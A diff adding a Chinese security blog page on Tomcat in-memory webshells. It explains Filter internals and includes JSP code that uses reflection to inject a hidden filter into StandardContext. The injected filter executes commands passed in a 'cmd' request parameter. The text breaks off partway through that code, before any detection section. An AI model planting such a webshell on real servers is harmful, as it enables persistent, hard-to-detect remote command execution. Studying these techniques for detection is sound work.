@@ -1,0 +1,1716 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>Tomcat 内存马分析及检测 | MYZXCG</title>
+
+    <link rel="stylesheet" href="/css/meme.min.ee7d92038178eda958210f69458541e2686ada11055b93762d6d324f2acc47c5.css"/>
+
+    
+    
+        <script src="/js/meme.min.4194bf2034241e3757fbbbf5fe4db43d0ff17c81f4496e6bc931504f0978cbd2.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="myzxcg" /><meta name="description" content="Filter Filter作用就是对web资源进行拦截，做一些处理后再交给下一个Filter或s……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="MYZXCG" />
+    <meta name="msapplication-starturl" content="../../../" />
+    <meta name="msapplication-TileColor" content="#603cba" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+
+    
+    
+
+    
+    <link rel="canonical" href="https://myzxcg.com/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-10-29T00:00:10+08:00",
+        "dateModified": "2021-11-20T15:16:22+08:00",
+        "url": "https://myzxcg.com/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/",
+        "headline": "Tomcat 内存马分析及检测",
+        "description": "Filter Filter作用就是对web资源进行拦截，做一些处理后再交给下一个Filter或s……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  5894 ,
+        "image": ["https://myzxcg.com/images/1635431899.png","https://myzxcg.com/images/1635431936.png","https://myzxcg.com/images/1635431967.png","https://myzxcg.com/images/1635431989.png"],
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "MYZXCG",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://myzxcg.com/icons/favicon.ico"
+            },
+            "url": "https://myzxcg.com/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://myzxcg.com/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+<meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
+
+    
+
+
+
+<meta property="og:title" content="Tomcat 内存马分析及检测" />
+<meta property="og:description" content="Filter Filter作用就是对web资源进行拦截，做一些处理后再交给下一个Filter或s……" />
+<meta property="og:url" content="https://myzxcg.com/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" />
+<meta property="og:site_name" content="MYZXCG" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/1635431899.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-10-29T00:00:10&#43;08:00" />
+    <meta property="article:modified_time" content="2021-11-20T15:16:22&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-Y0LZRMN44V');
+    </script>
+
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">MYZXCG</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">Tomcat 内存马分析及检测</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-10-29T00:00:10&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.10.29</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;12&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:filter" href="#filter">Filter</a>
+      <ol>
+        <li><a id="contents:静态添加filter" href="#静态添加filter">静态添加Filter</a></li>
+        <li><a id="contents:动态添加filter" href="#动态添加filter">动态添加Filter</a></li>
+        <li><a id="contents:tomcat7-及以上实现" href="#tomcat7-及以上实现">Tomcat7 及以上实现</a></li>
+        <li><a id="contents:tomcat6-实现" href="#tomcat6-实现">Tomcat6 实现</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:listener" href="#listener">Listener</a></li>
+    <li><a id="contents:servlet" href="#servlet">Servlet</a></li>
+    <li><a id="contents:valve" href="#valve">Valve</a></li>
+    <li><a id="contents:内存马检测" href="#内存马检测">内存马检测</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <h2 id="filter"><a href="#filter" class="anchor-link">#</a><a href="#contents:filter" class="headings">Filter</a></h2>
+<p>Filter作用就是对web资源进行拦截，做一些处理后再交给下一个Filter或servlet处理。通常都是用来拦截request或response进行处理。</p>
+<p>Filter调用流程:</p>
+<ol>
+<li>创建FilterChain，从FilterMaps中找出与请求URL对应的Filter名称，获取该名称对应的FilterConfig（在filterConfigs中查找），并添加到FilterChain中。</li>
+<li>调用FilterChain的doFilter()函数，在该函数中调用internalDoFilter()来遍历获取FilterChain里FilterConfig中Filter对象的doFilter方法。</li>
+</ol>
+<p><img src="/images/1635431899.png" alt=""></p>
+<h3 id="静态添加filter"><a href="#静态添加filter" class="anchor-link">#</a><a href="#contents:静态添加filter" class="headings">静态添加Filter</a></h3>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.web.filter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">customfilter</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>
+<span class="c1">//和我们编写的Servlet程序一样，Filter的创建和销毁由WEB服务器负责。web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Filter 初始化创建&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="c1">//这个方法完成实际的过滤操作。当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器。
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;执行过滤操作&#34;</span><span class="o">);</span>
+        <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span><span class="n">servletResponse</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="c1">//Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>在web.xml中注册filter，web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个<code>Filter</code>。这里设置<code>url-pattern</code>为<code>/hello-servlet</code>访问<code>/hello-servlet</code>url时就会触发。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="nt">&lt;web-app</span> <span class="na">xmlns=</span><span class="s">&#34;&lt;http://xmlns.jcp.org/xml/ns/javaee&gt;&#34;</span>
+         <span class="na">xmlns:xsi=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
+         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;&lt;http://xmlns.jcp.org/xml/ns/javaee&gt; &lt;http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&gt;&#34;</span>
+         <span class="na">version=</span><span class="s">&#34;4.0&#34;</span><span class="nt">&gt;</span>
+
+    <span class="nt">&lt;filter&gt;</span>
+        <span class="nt">&lt;filter-name&gt;</span>myfilter<span class="nt">&lt;/filter-name&gt;</span>
+        <span class="nt">&lt;filter-class&gt;</span>com.example.web.filter.customfilter<span class="nt">&lt;/filter-class&gt;</span>
+    <span class="nt">&lt;/filter&gt;</span>
+
+    <span class="nt">&lt;filter-mapping&gt;</span>
+        <span class="nt">&lt;filter-name&gt;</span>myfilter<span class="nt">&lt;/filter-name&gt;</span>
+        <span class="nt">&lt;url-pattern&gt;</span>/hello-servlet<span class="nt">&lt;/url-pattern&gt;</span>
+    <span class="nt">&lt;/filter-mapping&gt;</span>
+<span class="nt">&lt;/web-app&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><img src="/images/1635431936.png" alt=""></p>
+<h3 id="动态添加filter"><a href="#动态添加filter" class="anchor-link">#</a><a href="#contents:动态添加filter" class="headings">动态添加Filter</a></h3>
+<p>查看StandardContext对象，可以看到<code>filterConfigs、filterMaps、filterDefs</code>均在其中。</p>
+<ol>
+<li>filterDefs中存放了类似于Web.xml中<code>filter-name</code>和<code>filter-class</code>的对应关系。</li>
+<li>filterConfigs中存放了filterDef和当时的Context。</li>
+<li>filterMaps中存放了类似于Web.xml中<code>filter-name</code>和<code>url-pattern</code>的对应关系，里面代表了各个filter之间的调用顺序。</li>
+</ol>
+<p><img src="/images/1635431967.png" alt=""></p>
+<p><img src="/images/1635431989.png" alt=""></p>
+<ol>
+<li>
+<p><strong>获取Context</strong></p>
+<p><a href="https://myzxcg.com/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/%E8%8E%B7%E5%8F%96standardcontext" target="_blank" rel="noopener">参考之前写的文章</a> ，获取Tomcat 6-9版本的StandardContext。</p>
+</li>
+<li>
+<p><strong>注册内存马(JSP)</strong></p>
+<p>在编写代码时需要注意:  在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;!--</span> <span class="n">tomcat</span> <span class="n">7</span> <span class="o">--&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="kn">import</span> <span class="err">= &#34;</span><span class="nn">org.apache.catalina.deploy.FilterMap</span><span class="s">&#34; %&gt;
+</span><span class="s">&lt;%@ page import = &#34;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">deploy</span><span class="o">.</span><span class="na">FilterDef</span><span class="s">&#34; %&gt;
+</span><span class="s">
+</span><span class="s">&lt;!-- tomcat 8/9 --&gt;
+</span><span class="s">&lt;%@ page import = &#34;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">descriptor</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">FilterMap</span><span class="s">&#34; %&gt;
+</span><span class="s">&lt;%@ page import = &#34;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">descriptor</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">FilterDef</span><span class="err">&#34;</span>  <span class="o">%&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>Filter创建流程:</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">1</span><span class="o">.</span> <span class="n">创建一个恶意Filter</span><span class="err">，</span><span class="n">利用FilterDef对Filter进行一个封装</span>
+<span class="n">2</span><span class="o">.</span> <span class="n">将FilterDef添加到FilterDefs和filterConfigs中</span>  
+<span class="n">3</span><span class="o">.</span> <span class="n">创建FilterMap</span> <span class="err">，</span><span class="n">将Filter和urlpattern相对应</span><span class="err">，</span><span class="n">存放到filterMaps中</span><span class="err">（</span><span class="n">由于Filter生效会有一个先后顺序</span><span class="err">，</span><span class="n">所以让自定义的Filter放在最前面</span><span class="err">）</span>
+<span class="n">4</span><span class="o">.</span> <span class="n">每次请求createFilterChain都会依据此动态生成一个过滤链</span><span class="err">，</span><span class="n">而StandardContext又会一直保留到Tomcat生命周期结束</span><span class="err">，</span><span class="n">所以内存马就可以一直驻留下去</span><span class="err">，</span><span class="n">直到Tomcat重启</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ol>
+<h3 id="tomcat7-及以上实现"><a href="#tomcat7-及以上实现" class="anchor-link">#</a><a href="#contents:tomcat7-及以上实现" class="headings">Tomcat7 及以上实现</a></h3>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.Map&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Constructor&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.Context&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span> <span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html; charset=UTF-8&#34;</span> <span class="n">pageEncoding</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="o">%&gt;</span>
+
+<span class="o">&lt;%</span>
+    <span class="kd">final</span> <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">&#34;my_newfilter&#34;</span><span class="o">;</span>
+    <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
+
+    <span class="n">Field</span> <span class="n">appctx</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">appctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+
+    <span class="n">Field</span> <span class="n">stdctx</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">stdctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">stdctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+
+    <span class="n">Field</span> <span class="n">Configs</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="o">);</span>
+    <span class="n">Configs</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">Map</span> <span class="n">filterConfigs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Configs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">standardContext</span><span class="o">);</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="n">filterConfigs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Filter</span><span class="o">()</span> <span class="o">{</span>
+            <span class="nd">@Override</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
+
+            <span class="o">}</span>
+
+            <span class="nd">@Override</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
+                <span class="n">HttpServletRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span> <span class="n">servletRequest</span><span class="o">;</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">1024</span><span class="o">];</span>
+                    <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)).</span><span class="na">start</span><span class="o">();</span>
